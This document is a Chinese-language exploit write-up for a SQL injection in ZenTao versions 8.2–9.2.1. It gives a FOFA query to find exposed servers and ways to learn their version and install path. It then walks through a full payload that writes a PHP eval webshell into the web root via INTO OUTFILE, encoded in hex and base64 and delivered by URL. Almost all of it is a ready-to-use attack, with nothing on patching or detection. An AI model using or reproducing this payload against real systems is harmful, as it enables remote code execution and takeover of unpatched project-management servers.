# 禅道8.2-9.2.1版本注入漏洞
## 资产搜索
fofa app="易软天创-禅道系统"
### 获取服务版本
`/zentao/index.php?mode=getconfig`  
![](img/version.png)
### 获取绝对路径
url随便输入，根据报错查看路径：`/zentao/3424/`  
![](img/path.png)
## POC
- sql注入语句：  
```sql
select '<?php @eval($_POST[x])?>' into outfile '/opt/zbox/app/zentao/www/hack.php'
```
- 进行HEX编码(注意加密解密都不带0x，但是EXP中需要加上）：  
```hex
73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C6520272F6F70742F7A626F782F6170702F7A656E74616F2F7777772F6861636B2E70687027
```
- HEX编码后前面加上0x进行拼接：
```json
{"orderBy":"order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C6520272F6F70742F7A626F782F6170702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}
```
- 整体base64编码：
```base64
eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzJGNkY3MDc0MkY3QTYyNkY3ODJGNjE3MDcwMkY3QTY1NkU3NDYxNkYyRjc3Nzc3NzJGNjg2MTYzNkIyRTcwNjg3MDI3O1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9
```
- 发送EXP：
```url
http://x.x.x.x/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzJGNkY3MDc0MkY3QTYyNkY3ODJGNjE3MDcwMkY3QTY1NkU3NDYxNkYyRjc3Nzc3NzJGNjg2MTYzNkIyRTcwNjg3MDI3O1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9
```  
![](img/EXP.png)
参考：https://www.hacking8.com/bug-web/禅道/禅道8.2-9.2.1-注入GetShell.html


